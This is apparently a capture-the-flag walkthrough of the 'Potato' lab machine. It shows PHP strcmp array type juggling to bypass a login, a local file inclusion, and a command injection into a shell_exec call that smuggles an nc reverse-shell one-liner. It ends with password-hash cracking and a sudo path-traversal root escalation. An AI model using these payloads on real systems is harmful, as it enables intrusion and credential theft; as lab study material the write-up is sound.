# Potato
### Enumeration
Port scan shows that ports 22, 80 and 2112 are open:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-07 18:53 EST
Nmap scan report for 192.168.51.101
Host is up (0.00033s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
MAC Address: 00:50:56:BF:53:12 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds
```

We connect to FTP using `ftp ftp://anonymous@192.168.51.101:2112`, pressing `<Enter>` when prompted for a password, and download `index.php.bak`. The contents are:

```
<html>
<head></head>
<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>


  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>
```

### Foothold

Fumbled around with trying to guess the password based on small changes to the one in the file above. Ultimately, the way to exploit this is using the fact that there's a **_non-strict comparison_**. We send the following request through Burp (we discovered this path using Feroxbuster):

```
POST /admin/index.php?login=1 HTTP/1.1
Host: 192.168.51.101
Content-Type: application/x-www-form-urlencoded

username[]=blabla&password[]=blabla
```

Because we've forced the `username` and `password` variables to be arrays, `strcmp()` returns `NULL` instead of an integer. Because of the use of non-strict equality (`==`), `NULL == 0` returns true and we authenticate, getting back the following header:

```
Set-Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh; expires=Tue, 07-Mar-2023 23:58:50 GMT; Max-Age=31536000
```

Now we can use this password to login to the admin dashboard.

The `logs` page of the admin is of interest. We are able to control something in the page output, so originally I tried to inject PHP code. It was ultimately just rendering the filename being passed and so the code was not being executed. The page offered a file read capability, so next I tried local file inclusion, which it was vulnerable to. I read `dashboard.php` to get a better idea of how I might be able to inject commands through the file parameter:

```
POST /admin/dashboard.php?page=log HTTP/1.1
Host: 192.168.51.101
Content-Length: 21
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.51.101
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.51.101/admin/dashboard.php?page=log
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh
Connection: closeftpd 

file=../dashboard.php
```

Response included the relevant snippet:

```
if(isset($_POST['file'])){
  echo "Contenu du fichier " . $_POST['file'] .  " :  </br>";
  echo ("<PRE>" . shell_exec("cat logs/" .  $_POST['file']) . "</PRE>");
}
```

So we can just add a `;` to the end of a filename and pass in another command. We pass the following in a POST request to get a reverse shell:

```
file=log_01.txt; nc -e /bin/bash 192.168.51.200 9001
```

With a listener on port 9001, we get a shell as the `www-data` user.

### Privilege Escalation
Reading `/etc/passwd`, we see:

```
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```

We can crack this by first putting it in a file called `pass.txt` then using `john pass.txt`. We get the password `dragon`.

Now, we can SSH in as the user `webadmin` with the password `dragon`. Running `sudo -l`, we see:

```
(ALL : ALL) /bin/nice /notes/*
```

We can't write to `/notes` but we can create a file called `exploit` in our home directory with the contents `/bin/bash`, run `chmod +x /home/webadmin/exploit` and then use path traversal to execute it with sudo privileges:

```
sudo /bin/nice /notes/../home/webadmin/exploit
root@serv:/home/webadmin#
```

Read the flags and we're done!